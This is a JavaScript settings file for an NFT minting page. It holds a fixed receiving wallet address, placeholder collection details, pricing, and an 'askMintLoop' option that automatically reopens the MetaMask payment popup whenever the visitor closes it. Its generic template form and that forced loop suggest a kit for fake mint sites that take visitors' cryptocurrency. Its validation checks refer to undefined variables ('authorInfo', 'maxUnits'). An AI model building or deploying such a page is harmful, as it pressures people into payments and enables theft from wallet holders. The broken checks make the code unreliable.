var receiveAddress = "0x87Bc228cBE836E7bCed68e70bf1Ca5A705A70F39"; // your address 
var infuraProjectId = ""; // your infura project id

const collectionInfo = {
    name: "NFTs",
    title: "{name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: "08.03.2022",
    socialMedia: {
        discord: "",
        twitter: "https://twitter.com/",
    },
    medias: {
        preview: "preview.gif",
        favicon: "logo.png",
    },
    background: {
        type: "image", // Supported types: image, video, color
        image: "background.jpg", // Image for image type, video preview for video type
        video: "background.mp4", // If you don't use video, you can ignore this line
        color: "#4E4E6D", // If you don't use color, you can ignore this line
    }
}
const mintInfo = {
    price: 0.2, // Price per NFT.
    totalSupply: 667, // Total supply of NFTs.
    minUnits: 1, // Min units to buy.
    maxUnits: 6, // Max units to buy.
    askMintLoop: true, // If true, when the user closes the metamask popup, it reopens automatically.
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!authorInfo.address.startsWith("0x") ||
    (
        authorInfo.address.length >= 64 ||
        authorInfo.address.length <= 40
    )
) console.error(`Error: ${authorInfo.address} is not a valid Ethereum address.`);
//#endregion
